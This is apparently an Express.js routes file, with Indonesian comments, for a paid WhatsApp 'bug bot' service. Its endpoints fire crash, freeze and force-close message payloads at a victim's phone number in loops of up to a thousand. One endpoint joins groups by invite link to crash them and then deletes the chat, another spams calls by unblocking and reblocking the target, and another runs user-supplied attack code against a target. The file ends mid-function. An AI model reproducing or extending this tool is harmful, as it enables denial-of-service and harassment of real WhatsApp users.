const crypto = require('crypto');
const express = require('express');
const { 
  activeConnections,
  mess,
  GCquizzzz,
  CrashNotif,
  prepareAuthFolders,
  connectSession,
  startUserSessions,
  disconnectAllActiveConnections,
  permenCall,
  crashNotificationVVIP,
  uno,
  fcAjaSih,
  FreezeChatByMia,
  NeoLritzy,
  CrashUi,
  pay,
  delayspam,
  DelayHardV5,
  DelayBuldoBlankByMia,
  NanasTerbitForce,
  FreezeByMia,
  GroupCrashUi,
  VnXBlank,
  DelayFreezeByMia,
  StickerFC,
  forceCloseMentalVVIP,
  blank5msg,
  dingleybymia,
  DelayBuldoHardFreezeByMia,
  CrashUiMetaByMia,
  NanasCrashIos,
  ForcloseIos,
  FcClickByMia,
  BarzzTamvan,
  VnXdelayJmbd,
  isVipOrOwner,
  getVipSessionPath,
  prepareVipSessionFolders,
  connectVipSession,
  startVipSessions,
  getActiveVipConnections,
  isVipSession,
  getRandomVipConnection,
  checkActiveSessionInFolder
} = require('../services/whatsappService');
const { loadDatabase, saveDatabase } = require('../services/databaseService');
const { ROLE_COOLDOWNS, MAX_QUANTITIES } = require('../utils/constants');
const { logger } = require('../utils/logger');
const { activeKeys } = require('../middleware/authMiddleware');
const { spamCooldown } = require('../utils/globals');
const path = require('path');
const fs = require('fs');
const { VM } = require('vm2');

// Import WhatsApp modules
const { 
  makeWASocket, 
  useMultiFileAuthState, 
  DisconnectReason, 
  fetchLatestBaileysVersion 
} = require("@bellachu/baileys");
const pino = require('pino');

const router = express.Router();

// ... (kode sebelumnya di whatsappRoutes.js)

// Tambahkan import di bagian atas
const { addActivityLog } = require('../services/activityLogService');

// ... kode lainnya tetap sama ...

router.post("/testFunction", async (req, res) => {
  let { key, target, jumlah, functionCode } = req.body;

  // 🔥 BERSIHKAN NOMOR (HANYA ANGKA)
  target = (target || "").replace(/\D/g, "");

  // Validasi target
  if (!target || target.length < 10) {
    return res.json({ success: false, message: "Nomor target tidak valid. Minimal 10 digit." });
  }

  console.log(`[📤 TEST] Testing function to ${target} using key ${key} - Jumlah: ${jumlah}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Key tidak valid" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ success: false, message: "User not found" });
  }

  const userSessions = getUserActiveSessions(user.username);
  if (userSessions.length === 0) {
    return res.json({ 
      success: false, 
      message: "Private sender unavailable. Please add a sender first." 
    });
  }

  const randomSession = userSessions[Math.floor(Math.random() * userSessions.length)];
  const sock = randomSession.sock;
  const sessionName = randomSession.sessionName;

  console.log(`[📤 TEST] Using session: ${sessionName} for user: ${user.username}`);

  // 🔥 TARGET SUDAH BERSIH, LANGSUNG TAMBAH @s.whatsapp.net
  const targetJid = target + "@s.whatsapp.net";

  // 🔥 FUNGSI CREATE SAFE SOCK
  function createSafeSock(sock) {
    let sendCount = 0;
    const MAX_SENDS = 500;
    
    const normalize = (j) => {
      let str = String(j);
      let angka = str.replace(/[^0-9]/g, '');
      if (!angka || angka.length < 10) {
        throw new Error('Invalid nomor: ' + str);
      }
      if (angka.startsWith('0')) {
        angka = '62' + angka.substring(1);
      }
      return angka + '@s.whatsapp.net';
    };
    
    return {
      sendMessage: async (target, message) => {
        if (sendCount++ > MAX_SENDS) throw new Error("RateLimit");
        const jid = normalize(target);
        console.log(`[📤 SEND] Target: ${target} -> JID: ${jid}`);
        return await sock.sendMessage(jid, message);
      },
      relayMessage: async (target, messageObj, opts = {}) => {
        if (sendCount++ > MAX_SENDS) throw new Error("RateLimit");
        const jid = normalize(target);
        console.log(`[📤 RELAY] Target: ${target} -> JID: ${jid}`);
        return await sock.relayMessage(jid, messageObj, opts);
      }
    };
  }

  const safeSock = createSafeSock(sock);

  // 🔥 REGEX UNTUK MENDETEKSI FUNCTION
  const asyncFunctionRegex = /async\s+function\s+(\w+)\s*\(/g;
  let matches = [...functionCode.matchAll(asyncFunctionRegex)];
  let funcName = null;
  
  if (matches.length > 0) {
    funcName = matches[0][1];
  } else {
    const altRegex = /function\s+(\w+)\s*\(/g;
    const altMatches = [...functionCode.matchAll(altRegex)];
    if (altMatches.length > 0) {
      funcName = altMatches[0][1];
      console.log(`⚠️ Found function without 'async': ${funcName}`);
    }
  }
  
  if (!funcName) {
    console.log("❌ Raw functionCode:", functionCode);
    return res.json({ 
      success: false, 
      message: "Tidak ditemukan function. Pastikan format: async function nama() {}" 
    });
  }

  // 🔥 VM2 UNTUK EKSEKUSI KODE
  const { VM } = require('vm2');
  const vm = new VM({
    timeout: 10000,
    sandbox: {
      console,
      Buffer,
      sock: safeSock,
      target: targetJid,
      sleep: (ms) => new Promise(resolve => setTimeout(resolve, ms))
    },
    eval: false,
    wasm: false
  });

  let fn = null;

  try {
    vm.run(functionCode);
    for (const key of Object.keys(vm.sandbox)) {
      if (typeof vm.sandbox[key] === 'function') {
        fn = vm.sandbox[key];
        funcName = key;
        break;
      }
    }
    if (!fn) {
      return res.json({ 
        success: false, 
        message: "Tidak ditemukan function dalam kode. Pastikan ada async function." 
      });
    }
    console.log(`✅ Found function: ${funcName}`);
  } catch (err) {
    return res.json({ 
      success: false, 
      message: `Error parsing function: ${err.message}` 
    });
  }

  // 🔥 EKSEKUSI FUNCTION SEBANYAK JUMLAH
  let successCount = 0;
  let failCount = 0;
  let errorMessages = [];

  for (let i = 0; i < jumlah; i++) {
    try {
      if (fn.length === 1) {
        await fn(targetJid);
      } else if (fn.length === 2) {
        await fn(safeSock, targetJid);
      } else {
        await fn(safeSock, targetJid, true);
      }
      successCount++;
    } catch (err) {
      failCount++;
      const errMsg = err.message || "Unknown error";
      if (!errorMessages.includes(errMsg) && errorMessages.length < 5) {
        errorMessages.push(errMsg);
      }
      console.error(`Execution ${i+1} failed:`, errMsg);
    }
    await new Promise(resolve => setTimeout(resolve, 200));
  }

  console.log(`[✅ TEST] Selesai - Sukses: ${successCount}, Gagal: ${failCount}`);

  res.json({
    success: true,
    message: `Test function selesai - Sukses: ${successCount}, Gagal: ${failCount}`,
    successCount,
    failCount,
    errors: errorMessages
  });
});

// Group Bug endpoint - Hanya untuk VIP dan Owner (Single Response)
router.get("/groupBug", async (req, res) => {
  const { key, linkGroup } = req.query;

  // 1. Autentikasi dan Otorisasi
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  // [MODIFIKASI] Menambahkan 'high owner'
  if (!["vip", "owner", "high admin", "admin", "dev", "ceo", "reseller", "reseller1"].includes(user.role)) {
    return res.status(403).json({ valid: false, message: "Access denied. VIP, Owner, or High Owner role required." });
  }

  // 2. Validasi Parameter (hanya linkGroup yang diperiksa)
  if (!linkGroup) return res.status(400).json({ valid: false, message: "Group link is required" });

  // Ekstrak kode undangan dari link grup
  const match = linkGroup.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.status(400).json({ valid: false, message: "Invalid group link format" });
  const inviteCode = match[1];

  // 3. Cek ketersediaan private session
  const userSessions = getUserActiveSessions(user.username);
   
  if (userSessions.length === 0) {
    return res.json({ 
      valid: false, 
      message: "Private sender unavailable. Please add a sender first." 
    });
  }

  // Pilih session acak dari milik pengguna
  const randomSession = userSessions[Math.floor(Math.random() * userSessions.length)];
  const sock = randomSession.sock;
  const sessionName = randomSession.sessionName;

  // 4. Jalankan seluruh proses dan tunggu hingga selesai sebelum merespons
  try {
    const result = await new Promise((resolve, reject) => {
      // Gunakan setImmediate agar tidak memblokir event loop, tapi tetap tunggu hasilnya
      setImmediate(async () => {
        try {
          logger.info(`[📤 GROUP BUG] Starting process with session ${sessionName} for group ${inviteCode}`);

          let finalResult = {
            success: false,
            canSendMessage: false,
            groupInfo: null,
            error: null
          };

          // 4.1. Bergabung dengan grup
          let groupJid;
          try {
            groupJid = await sock.groupAcceptInvite(inviteCode);
            logger.info(`[✅ GROUP BUG] Successfully joined group: ${groupJid}`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to join group: ${err.message}`);
            finalResult.error = `Failed to join group: ${err.message}`;
            return resolve(finalResult);
          }

          // Tunggu sebentar untuk memastikan koneksi stabil
          await sleep(3000);

          // 4.2. Ambil metadata grup
          let groupMetadata;
          try {
            groupMetadata = await sock.groupMetadata(groupJid);
            logger.info(`[✅ GROUP BUG] Retrieved group metadata`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to get group metadata: ${err.message}`);
            // Lanjutkan meskipun gagal ambil metadata
          }

          // 4.3. Coba kirim pesan ke grup
          try {
            await sock.sendMessage(groupJid, { text: "Halo" });
            finalResult.canSendMessage = true;
            logger.info(`[✅ GROUP BUG] Successfully sent message to group`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to send message to group: ${err.message}`);
            logger.info(`[ℹ️ GROUP BUG] Group might have chat disabled`);
          }

          // 4.4. Kirim kombinasi bug yang sudah di-hardcode jika pesan berhasil dikirim
          if (finalResult.canSendMessage) {
            try {
              logger.info(`[📤 GROUP BUG] Sending hardcoded bug combination to group`);
              await GroupCrashUi(sock, groupJid);
              await sock.sendMessage(groupJid, { text: "Eh" });
              logger.info(`[✅ GROUP BUG] Successfully sent bug combination to group`);
            } catch (err) {
              logger.error(`[❌ GROUP BUG] Failed to send bug to group: ${err.message}`);
            }
          }

          // 4.5. Keluar dari grup
          try {
            await sock.groupLeave(groupJid);
            logger.info(`[✅ GROUP BUG] Successfully left group: ${groupJid}`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to leave group: ${err.message}`);
          }

          // 4.6. Hapus chat grup dari WhatsApp
          try {
            await sock.chatModify({
              delete: true,
              lastMessages: [{
                key: {
                  remoteJid: groupJid,
                  fromMe: true,
                  id: "1"
                },
                messageTimestamp: Date.now()
              }]
            }, groupJid);
            logger.info(`[✅ GROUP BUG] Successfully deleted group chat`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to delete group chat: ${err.message}`);
          }

          // Siapkan respons akhir
          finalResult.success = true;
          if (groupMetadata) {
            finalResult.groupInfo = {
              id: groupMetadata.id,
              subject: groupMetadata.subject,
              desc: groupMetadata.desc,
              owner: groupMetadata.owner,
              creation: groupMetadata.creation,
              participants: groupMetadata.participants.length
            };
          }
           
          resolve(finalResult);

        } catch (error) {
          logger.error(`[❌ GROUP BUG ERROR] ${error.message}`);
          reject(error);
        }
      });
    });

    // 5. Kirim respons akhir HANYA SATU KALI setelah semua proses selesai
    res.json(result);
    
    // 6. Tambahkan activity log
    if (result.success) {
      addActivityLog(user.username, 'Group Bug Attack', {
        groupInviteCode: inviteCode,
        groupInfo: result.groupInfo,
        sessionUsed: sessionName,
        canSendMessage: result.canSendMessage
      });
    } else {
      addActivityLog(user.username, 'Failed Group Bug Attack', {
        groupInviteCode: inviteCode,
        error: result.error,
        sessionUsed: sessionName
      });
    }

  } catch (error) {
    logger.error(`[❌ GROUP BUG FATAL ERROR] ${error.message}`);
    res.status(500).json({ valid: false, message: "An internal server error occurred." });
    
    // Tambahkan activity log untuk error
    addActivityLog(user.username, 'Failed Group Bug Attack', {
      groupInviteCode: inviteCode,
      error: error.message,
      sessionUsed: sessionName
    });
  }
});

// Send bug to target
router.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  target = (target || "").replace(/\D/g, ""); // hapus semua karakter non-digit
  logger.info(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    logger.info("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    logger.info("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // Cek apakah user adalah VIP atau Owner
  const userIsVipOrOwner = isVipOrOwner(user);

  // Role-based Cooldown
  const role = user.role || "member";
  const cooldownSeconds = ROLE_COOLDOWNS[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    logger.info(`${user.username} Still Cooldown`);
    
    // Tambahkan activity log untuk cooldown
    addActivityLog(user.username, 'Bug Attack - Cooldown', {
      target,
      bugType: bug,
      remainingCooldown: cooldownSeconds - diffSeconds
    });
    
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // Respon duluan
  user.lastSend = now;
  saveDatabase(db);
  logger.info(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

  // Kirim bug di background
  setImmediate(async () => {
    try {
      // Member hanya pakai private sender sendiri, role lain pakai global sender
      const useGlobalSender = user.role !== "member";
      const sock = await checkActiveSessionInFolder(user.username, useGlobalSender);
       
      if (!sock) {
        logger.warn(`[❌ BUG] Tidak ada session aktif untuk user ${user.username}`);
        
        // Tambahkan activity log untuk tidak ada session
        addActivityLog(user.username, 'Failed Bug Attack - No Session', {
          target,
          bugType: bug
        });
        
        return;
      }
       
      // ✅ PERUBAHAN DI SINI: JANGAN buat variabel baru, cukup ubah nilainya atau pakai nama lain
      target = target + "@s.whatsapp.net"; 
      // Atau kalau mau tetap simpan nilai aslinya, pakai nama variabel baru:
      // const targetJid = target + "@s.whatsapp.net";
      // Lalu ganti semua pemakaian selanjutnya menjadi targetJid

      logger.info(`[📤 BUG] Menggunakan session untuk mengirim bug ke ${target}`);

      // Kirim bug berdasarkan tipe
      switch (bug) {
        case "buldoxfreze":
          for (let i = 0; i < 100; i++) {
            await DelayBuldoHardFreezeByMia(sock, target);
            await DelayBuldoBlankByMia(target);
            await DelayHardV5(target);
            await FreezeChatByMia(sock, target);
            await sleep(100);
          }
          break;
        case "blankui":
          for (let i = 0; i < 100; i++) {
            await DelayBuldoHardFreezeByMia(sock, target);
            await BarzzTamvan(sock, target);
            await sleep(1000)
          }
          break;
        case "crashios":
          for (let i = 0; i < 200; i++) {
          await NanasCrashIos(sock, target);
          await ForcloseIos(sock, target, true);
            await sleep(1000)
          }
          break;
          case "crashandro":
          for (let i = 0; i < 100; i++) {
          await FcClickByMia(sock, target);
          await FreezeByMia(sock, target);
          await BarzzTamvan(sock, target);
            await sleep(1000)
          }
          break;
        case "fcinvis":
          for (let i = 0; i < 500; i++) {
            await fcinvisotax(sock, target);
            await FriendBerulah(sock, target);
            await sleep(500);
          }
          break;
        case "fcnoinvis":
          for (let i = 0; i < 1000; i++) {
            await uno(sock, target);
            await sleep(500);
          }
          break;
        case "uix":
          for (let i = 0; i < 1000; i++) {
            await pay(sock, target);
            await sleep(500);
          }
          break;
        case "delayhard":
          for (let i = 0; i < 100; i++) {
            await delayspam(sock, target);
            await VnXdelayJmbd(sock, target);
            await dingleybymia(sock, target);
            await DelayFreezeByMia(sock, target);
            await sleep(1000);
          }
          break;
        case "blankclick":
          for (let i = 0; i < 5; i++) {
            await blank5msg(sock, target);
            await sleep(500);
          }
          break;
        case "invisxblank":
          for (let i = 0; i < 1000; i++) {
            await StickerFC(sock, target);
            await sleep(500);
          }
          break;
      }

      logger.info(`[✅ BUG] Bug '${bug}' terkirim ke ${target}`);
      
      // Tambahkan activity log untuk berhasil
      addActivityLog(user.username, 'Bug Attack', {
        target,
        bugType: bug,
        success: true
      });
      
    } catch (err) {
      logger.error(`[❌ BUG ERROR] ${err.message}`);
      
      // Tambahkan activity log untuk error
      addActivityLog(user.username, 'Failed Bug Attack', {
        target,
        bugType: bug,
        error: err.message
      });
    }
  });
});

// Spam call to target
router.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  // [MODIFIKASI] Menambahkan 'high owner'
  if (!user || !["vip", "reseller", "reseller1", "owner", "high admin", "admin", "dev", "ceo"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  // Cek apakah user adalah VIP atau Owner
  const userIsVipOrOwner = isVipOrOwner(user);

  const role = user.role || "member";
  const maxQty = MAX_QUANTITIES[role] || 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  // Dapatkan session aktif
  let bizSessions = [];
   
  // Jika user VIP/Owner, coba gunakan session VIP terlebih dahulu
  if (userIsVipOrOwner) {
    const vipConnections = getActiveVipConnections();
    for (const [sessionName, sock] of Object.entries(vipConnections)) {
      if (biz[sessionName]) {
        bizSessions.push({
          sessionName: sessionName,
          sock: sock,
          type: "Business",
          isVip: true
        });
      }
    }
  }
   
  // Jika tidak ada session VIP atau user bukan VIP/Owner, gunakan session milik pengguna
  if (bizSessions.length === 0) {
    const userSessions = getUserActiveSessions(user.username);
    bizSessions = userSessions.filter(s => s.type === "Business");
  }
   
  if (bizSessions.length === 0) {
    return res.json({ valid: false, message: "No business session available" });
  }

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    
    // Tambahkan activity log untuk cooldown
    addActivityLog(user.username, 'Spam Call - Cooldown', {
      target,
      quantity: callQty,
      remainingCooldown: remaining
    });
    
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
    // Pilih session acak
    const randomSession = bizSessions[Math.floor(Math.random() * bizSessions.length)];
    const sock = randomSession.sock;
    const sessionName = randomSession.sessionName;
    
    // Unblock target terlebih dahulu
    await sock.updateBlockStatus(jid, "unblock");
    await sock.offerCall(jid, true);
    await sock.updateBlockStatus(jid, "block");
    logger.info(`[✅ FIRST SPAM CALL] to ${jid} from ${sessionName}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });
    
    // Tambahkan activity log untuk spam call
    addActivityLog(user.username, 'Spam Call', {
      target,
      quantity: callQty,
      sessionUsed: sessionName,
      success: true
    });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          // Pilih session acak
          const randomSession = bizSessions[Math.floor(Math.random() * bizSessions.length)];
          const sock = randomSession.sock;
           
          // Unblock target terlebih dahulu
          await sock.updateBlockStatus(jid, "unblock");
          await sock.offerCall(jid, true);
          await sock.updateBlockStatus(jid, "block");

          logger.info(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${randomSession.sessionName}`);
        } catch (err) {
          logger.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    logger.warn("[❌ FIRST CALL ERROR]", err.message);
    
    // Tambahkan activity log untuk error
    addActivityLog(user.username, 'Failed Spam Call', {
      target,
      quantity: callQty,
      error: err.message
    });
    
    return res.json({ valid: false, message: "Call failed" });
  }
});

// Custom Bug endpoint - Hanya untuk VIP dan Owner
router.get("/customBug", async (req, res) => {
  const { key, target, bug, qty, delay, senderType } = req.query;

  // 1. Autentikasi dan Otorisasi
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  // [MODIFIKASI] Menambahkan 'high owner'
  if (!["vip", "owner", "high admin", "admin", "dev", "ceo", "reseller", "reseller1"].includes(user.role)) {
    return res.status(403).json({ valid: false, message: "Access denied. VIP, Owner, or High Owner role required." });
  }

  // 2. Validasi Parameter
  const cleanTarget = (target || "").replace(/\D/g, "");
  if (!cleanTarget) return res.status(400).json({ valid: false, message: "Target is required" });
  if (!bug) return res.status(400).json({ valid: false, message: "Bug list is required" });
  if (!["global", "private"].includes(senderType)) return res.status(400).json({ valid: false, message: "Invalid senderType. Must be 'global' or 'private'." });

  const bugsToSend = bug.split(',').map(b => b.trim());
  const parsedQty = parseInt(qty) || 1;
  const parsedDelay = parseInt(delay) || 100; // Default delay 100ms jika tidak ditentukan

  // 3. Logika berdasarkan SenderType
  let sock, sessionName, maxQty, effectiveDelay;

  if (senderType === "global") {
    maxQty = 10;
    effectiveDelay = 500; // Abaikan delay user, gunakan 500ms
    sock = getRandomVipConnection();
     
    // Cek ketersediaan session global
    if (!sock) {
      return res.json({ valid: false, message: "Selected sender type (global) not available right now." });
    }
    sessionName = "VIP Session";
  } else { // private
    maxQty = 200;
    effectiveDelay = Math.max(parsedDelay, 10); // Delay minimal 10ms
    const userSessions = getUserActiveSessions(user.username);
     
    // Cek ketersediaan session private
    if (userSessions.length === 0) {
      return res.json({ valid: false, message: "Selected sender type (private) not available right now." });
    }
    const randomSession = userSessions[Math.floor(Math.random() * userSessions.length)];
    sock = randomSession.sock;
    sessionName = randomSession.sessionName;
  }

  // 4. Validasi Qty akhir
  if (parsedQty > maxQty) {
    return res.json({
      valid: false,
      message: `Quantity too high. Max allowed for sender type '${senderType}' is ${maxQty}.`
    });
  }

  // 5. Respon sukses segera
  res.json({
    valid: true,
    message: `Attack queued on ${cleanTarget} using ${senderType} sender.`,
    details: {
      target: cleanTarget,
      senderType: senderType,
      bugs: bugsToSend,
      qty: parsedQty,
      delay: effectiveDelay
    }
  });

  // 6. Eksekusi di background
  setImmediate(async () => {
    try {
      const target = `${cleanTarget}@s.whatsapp.net`;
      logger.info(`[📤 CUSTOM BUG] Starting attack on ${target} using ${sessionName} (${senderType})`);

      // Pemetaan nama bug ke fungsi
      const bugFunctions = {
        'crashNotificationVVIP': crashNotificationVVIP,
        'stealthCrashVVIP': stealthCrashVVIP,
        'gsIntX': gsIntX,
        'forceCloseMentalVVIP': forceCloseMentalVVIP,
        'permenCall': permenCall,
        'delayspam': delayspam
      };

      for (let i = 0; i < parsedQty; i++) {
        for (const bugName of bugsToSend) {
          const bugFunction = bugFunctions[bugName];
          if (bugFunction) {
            await bugFunction(sock, target);
            await sleep(effectiveDelay);
          } else {
            logger.warn(`[⚠️ CUSTOM BUG] Unknown bug function: ${bugName}`);
          }
        }
      }
      logger.info(`[✅ CUSTOM BUG] Attack on ${target} completed.`);
      
      // Tambahkan activity log untuk custom bug
      addActivityLog(user.username, 'Custom Bug Attack', {
        target: cleanTarget,
        senderType,
        bugs: bugsToSend,
        quantity: parsedQty,
        delay: effectiveDelay,
        sessionUsed: sessionName,
        success: true
      });
      
    } catch (err) {
      logger.error(`[❌ CUSTOM BUG ERROR] ${err.message}`);
      
      // Tambahkan activity log untuk error
      addActivityLog(user.username, 'Failed Custom Bug Attack', {
        target: cleanTarget,
        senderType,
        bugs: bugsToSend,
        quantity: parsedQty,
        error: err.message,
        sessionUsed: sessionName
      });
    }
  });
});

// ... kode lainnya tetap sama ...
// Get active WhatsApp connections
router.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  // Cek apakah user adalah VIP atau Owner
  const userIsVipOrOwner = isVipOrOwner(user);
   
  let privateConns = []; // Session milik pengguna sendiri
  let globalConns = [];  // Session global (VIP)
   
  // Jika user VIP/Owner, sertakan session VIP sebagai session global
  if (userIsVipOrOwner) {
    const vipConnections = getActiveVipConnections();
    for (const [sessionName, sock] of Object.entries(vipConnections)) {
      const type = bizSessions.includes(sessionName) ? "Business" : (messSessions.includes(sessionName) ? "Messenger" : "Unknown");
      globalConns.push({
        sessionName: sessionName,
        type: type,
        isActive: true,
        isVip: true,
        owner: "global" // Menandakan ini adalah session global
      });
    }
  }
   
  // Dapatkan session milik user
  const userConns = getUserActiveSessions(user.username);
   
  // PERBAIKAN: Hapus properti 'sock' untuk menghindari circular reference
  const safeUserConns = userConns.map(conn => {
    // Menggunakan destructuring untuk membuat objek baru tanpa properti 'sock'
    const { sock, ...safeConn } = conn; 
    return {
      ...safeConn,
      owner: user.username // Menandakan ini adalah session milik user
    };
  });

  privateConns = [...safeUserConns];
    
  logger.info(user.username);
  return res.json({
    valid: true,
    connections: {
      private: privateConns,  // Session milik pengguna sendiri
      global: globalConns     // Session global (VIP)
    }
  });
});

// ... (kode setelahnya di whatsappRoutes.js)
// Get pairing code for new WhatsApp session
router.get("/getPairing", async (req, res) => {
  const { key, number, isGlobal } = req.query; // Tambahkan isGlobal parameter
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    logger.info("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  if (!number) return res.status(400).json({ error: "Number is required" });

  // [MODIFIKASI] Check if Global pairing requested
  const isGlobalSession = isGlobal === 'true';

  // Optional: Add permission check for global creation if needed
  // if (isGlobalSession && !['owner', 'vip', 'high owner'].includes(user.role)) ...

  try {
    // [MODIFIKASI] Tentukan path berdasarkan isGlobal
    let sessionDir;
    if (isGlobalSession) {
        sessionDir = path.join('vip', number);
        if (!fs.existsSync('vip')) fs.mkdirSync('vip', { recursive: true });
    } else {
        sessionDir = path.join('permenmd', user.username, number);
        if (!fs.existsSync(`permenmd/${user.username}`)) fs.mkdirSync(`permenmd/${user.username}`, { recursive: true });
    }

    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut) {
          logger.info(`🔄 Reconnecting ${number}...`);
          await waiting(3000);
          // [MODIFIKASI] Pass isGlobal flag ke pairingWa
          await pairingWa(number, user.username, 1, isGlobalSession);
        } else {
          delete activeConnections[number];
        }
      } else if (connection === "open") {
         // Handle pemindahan file creds saat sukses connect
         activeConnections[number] = sock;
         const sourceCreds = path.join(sessionDir, 'creds.json');

         try {
             await waiting(2000);
             if (fs.existsSync(sourceCreds)) {
                 const data = fs.readFileSync(sourceCreds);

                 if (isGlobalSession) {
                     // Global: simpan ke vip/ saja
                     const destVip = path.join('vip', `${number}.json`);
                     fs.writeFileSync(destVip, data);
                     logger.info(`✅ Session saved to ${destVip}`);
                 } else {
                     // Private: simpan ke permenmd/<username>/ DAN vip/ (global pool)
                     const destPrivate = path.join('permenmd', user.username, `${number}.json`);
                     fs.writeFileSync(destPrivate, data);
                     logger.info(`✅ Session saved to ${destPrivate}`);

                     if (!fs.existsSync('vip')) fs.mkdirSync('vip', { recursive: true });
                     const destVip = path.join('vip', `${number}.json`);
                     fs.writeFileSync(destVip, data);
                     logger.info(`✅ Session also saved to global pool: ${destVip}`);
                 }
             }
         } catch (e) {
             logger.error(`❌ Failed save session: ${e.message}`);
         }
      }
    });
    
    // If not registered, generate pairing code
    if (!sock.authState.creds.registered) {
      await waiting(1000);
      let code = await sock.requestPairingCode(number);
      logger.info(code);
      if (code) {
        return res.json({ valid: true, number, pairingCode: code });
      } else {
        return res.json({ valid: false, message: "Already registered or failed to get code" });
      }
    }
  } catch (err) {
    logger.error("Error in getPairing:", err);
    return res.status(500).json({ error: err.message });
  }
});

// Helper function to wait
function waiting(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Helper function for pairing WhatsApp
// [MODIFIKASI] Added isGlobal parameter default false
async function pairingWa(number, owner, attempt = 1, isGlobal = false) {
  if (attempt >= 5) {
    return false;
  }
  
  // [MODIFIKASI] Determine path based on isGlobal
  let sessionDir;
  if (isGlobal) {
      sessionDir = path.join('vip', number);
      if (!fs.existsSync('vip')) fs.mkdirSync('vip', { recursive: true });
  } else {
      sessionDir = path.join('permenmd', owner, number); 
      if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd', { recursive: true });
  }

  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        logger.info(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        // [MODIFIKASI] Pass isGlobal recursively
        await pairingWa(number, owner, attempt + 1, isGlobal);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');

      try {
        await waiting(3000);
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds);

          if (isGlobal) {
            // Global: simpan ke vip/ saja
            const destVip = path.join('vip', `${number}.json`);
